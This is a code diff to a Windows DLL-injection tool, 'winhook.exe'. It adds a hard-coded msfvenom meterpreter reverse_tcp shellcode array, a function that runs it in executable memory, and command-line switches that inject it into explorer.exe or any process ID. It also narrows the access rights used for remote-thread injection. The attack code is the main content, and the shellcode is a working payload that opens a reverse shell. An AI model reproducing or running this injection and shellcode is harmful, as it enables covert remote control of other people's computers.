@@ -69,7 +69,7 @@ LPPROCESS_INFORMATION open_process(char *lpApplicationName, int wait_time) {
 		NULL,           // Process handle not inheritable
 		NULL,           // Thread handle not inheritable
 		FALSE,          // Set handle inheritance to FALSE
-		0, //CREATE_NEW_CONSOLE,
+		0, //CREATE_NEW_CONSOLE, //CREATE_SUSPENDED,
 		NULL,           // Use parent's environment block
 		NULL,           // Use parent's starting directory
 		&si,            // Pointer to STARTUPINFO structure
@@ -130,8 +130,9 @@ PROCESSENTRY32* snapshotAllProcessesEntry(DWORD processId) {
 	return NULL;
 }
 
-DWORD snapshotAllProcessesB(std::wstring processName) {
+DWORD getProcessIdFromSnapshot(wchar_t* processName) {
 
+	std::wstring wprocessName = std::wstring(processName);
 	PROCESSENTRY32 *pe32 = (PROCESSENTRY32*)malloc(sizeof(PROCESSENTRY32));
 	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
@@ -157,7 +158,7 @@ DWORD snapshotAllProcessesB(std::wstring processName) {
 
 				if (hProcess == NULL)
 					printf("OpenProcess Failed, GetLastError() = %u\n", (uint32_t)GetLastError());
-				else if (processName.compare(pe32->szExeFile)==0) {
+				else if (wprocessName.compare(pe32->szExeFile)==0) {
 					//cout << pe32->szExeFile << endl;
 					CloseHandle(hProcessSnap);
 					CloseHandle(hProcess);
@@ -366,7 +367,8 @@ bool injectDll(int procID, char *dllPath) {
 		printf(" Error: the specified process couldn't be found. \tError Code: %u\n", (uint32_t)GetLastError());
 		printf(" Trying other way... \n");
 
-		process = snapshotAllProcesses((DWORD)procID, PROCESS_ALL_ACCESS);
+		process = snapshotAllProcesses((DWORD)procID, PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE );
+														// Required by Alpha | CreateRemoteThread | VirtualAllocEx | WriteProcessMemory
 
 		if (process == NULL) {
 			printf("Error: the specified process couldn't be found. \tError Code: %u\n", (uint32_t)GetLastError());
@@ -430,11 +432,66 @@ bool injectDll(int procID, char *dllPath) {
 
 }//end of function
 
+
+
+/**
+* Reference :
+*	https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/
+*
+*	https://netsec.ws/?p=331
+*	`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=9999 -f c`
+*
+*/
+static const unsigned char code[] =
+"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
+"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
+"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x7f\x00\x00\x01"
+"\x68\x02\x00\x27\x0f\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
+"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
+"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
+"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
+"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
+"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
+"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
+"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
+"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
+"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
+"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
+
+void executeShellCodeOfReverseTCP() {
+	void *exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, code, sizeof(code));
+	printf("Creating ReverseTCP @ port 9999. | Listening to accept for few seconds! ");
+	((void(*)())exec)();
+	Sleep(12000);
+}
+
+int injectShellCodeOfReverseTCP(int procID) {
+	printf("Injecting Shellcode into PID %d.\n", procID);
+	return (int)injectDll(procID, (char*)code);
+}
+
+int __exit(FILE* logFile) {
+	printf("\nUsage : winhook.exe -p TargetProcessId -f DLLPath/Name \n");
+	//log_call("Usage : winhook.exe -p TargetProcessId -f DLLPath/Name "); //Also tests the functionality in detours.dll
+	fclose(logFile);
+	return 0;
+}
+
 /**
 * Injects the DLL created using detours.cpp, into a specific process
 *
 * Usage:-
-	winhook.exe -e TargetProcessId -f DLLPath/Name
+	winhook.exe -p TargetProcessId -f DLLPath/Name
 */
 int main(int argc, char *argv[]) {
 
@@ -442,11 +499,11 @@ int main(int argc, char *argv[]) {
 	const int size = 125 * sizeof(char);
 	char *msg = (char*)calloc(125, sizeof(char));
 	memset(msg, '\0', size);
+	setExplorer(true);
 
 	if (argc == 1) {
-		
-		const std::wstring pshl = std::wstring(L"powershell.exe");
-		DWORD pid = snapshotAllProcessesB(pshl);
+
+		DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"powershell.exe");
 		//printf("PID: %u\n", pid);
 
 		if (pid>0 && injectDll(pid, (char*)"C:\\WinHook.dll")) {
@@ -455,32 +512,97 @@ int main(int argc, char *argv[]) {
 			log_call(msg);
 		}
 		else {
-			sprintf_s(msg, size, " [%u][C:\\WinHook.dll] DLL Injected Failed! ", pid);
+			sprintf_s(msg, size, " [C:\\WinHook.dll] DLL Injection Failed! No instance of Powershell found ");
 			printf("%s\n", msg);
 			log_call(msg);
 		}
-		Sleep(5000);
 
-	}else if (argc < 5) {
-		printf("\nUsage : winhook.exe -e TargetProcessId -f DLLPath/Name \n");
-		//log_call("Usage : winhook.exe -e TargetProcessId -f DLLPath/Name "); //Also tests the functionality in detours.dll
-		//cout << getPid() << endl;
-		//msgBox(getCurrentDateTime());
-		ExitProcess(0);
-	} else {
-		if (injectDll(atoi(argv[2]), argv[4])) {
-			sprintf_s(msg, size, " [%s][%s] DLL Injected Successfully! ", argv[4], argv[2]);
+		Sleep(5000);
+	}
+	else if (argc == 2 && strcmp(argv[1], "-rsc")==0 ) {
+		executeShellCodeOfReverseTCP();
+	}
+	else if (argc == 3) {
+		
+		if (strcmp(argv[1], "-exp") == 0 && strcmp(argv[2], "-sc") == 0) {
+			DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");
+			injectShellCodeOfReverseTCP(pid);
+		}
+		else if (strcmp(argv[2], "-exp") == 0 && strcmp(argv[1], "-sc") == 0){
+			DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");
+			injectShellCodeOfReverseTCP(pid);
+		}
+		else {
+			return __exit(logFile);
+		}
+	}
+	else if (argc == 4) {
+
+		char *dllpath = NULL;
+
+		if (strcmp(argv[1], "-exp") == 0 && strcmp(argv[2], "-f") == 0) {
+			dllpath = argv[3];
+		}
+		else if (strcmp(argv[1], "-f") == 0 && strcmp(argv[3], "-exp") == 0) {
+			dllpath = argv[2];
+		}
+		else if (strcmp(argv[1], "-sc") == 0 && strcmp(argv[2], "-p") == 0) {
+			injectShellCodeOfReverseTCP(atoi(argv[3]));
+			return 0;
+		}
+		else if (strcmp(argv[1], "-p") == 0 && strcmp(argv[3], "-sc") == 0) {
+			injectShellCodeOfReverseTCP(atoi(argv[2]));
+			return 0;
+		}
+		else {
+			return __exit(logFile);
+		}
+
+		DWORD pid = getProcessIdFromSnapshot((wchar_t*)L"explorer.exe");
+
+		if (dllpath != NULL && injectDll(pid, dllpath)) {
+			sprintf_s(msg, size, " [%s][%u] DLL Injected Successfully! ", dllpath, pid);
 			printf("%s\n", msg);
 			log_call(msg);
 		}
 		else {
-			sprintf_s(msg, size, " [%s][%s] DLL Injected Failed! ", argv[4], argv[2]);
+			sprintf_s(msg, size, " [%s][%u] DLL Injection Failed! ", dllpath, pid);
 			printf("%s\n", msg);
 			log_call(msg);
 		}
+
+	}
+	else if (argc == 5) {
+		
+		char *pid = NULL;
+		char *dllpath = NULL;
+
+		if (strcmp(argv[1], "-p") == 0 && strcmp(argv[3], "-f") == 0) {
+			pid = argv[2];
+			dllpath = argv[4];
+		} else if (strcmp(argv[3], "-p") == 0 && strcmp(argv[1], "-f") == 0) {
+			pid = argv[4];
+			dllpath = argv[2];
+		}
+		else {
+			return __exit(logFile);
+		}
+
+		if ( pid!=NULL && dllpath!=NULL && injectDll(atoi(pid), dllpath) ) {
+			sprintf_s(msg, size, " [%s][%s] DLL Injected Successfully! ", dllpath, pid);
+			printf("%s\n", msg);
+			log_call(msg);
+		}
+		else {
+			sprintf_s(msg, size, " [%s][%s] DLL Injection Failed! ", dllpath, pid);
+			printf("%s\n", msg);
+			log_call(msg);
+		}
+	}
+	else {
+		return __exit(logFile);
 	}//end of if-else
 
-	fclose(logFile);
 	return 0;
 }
 
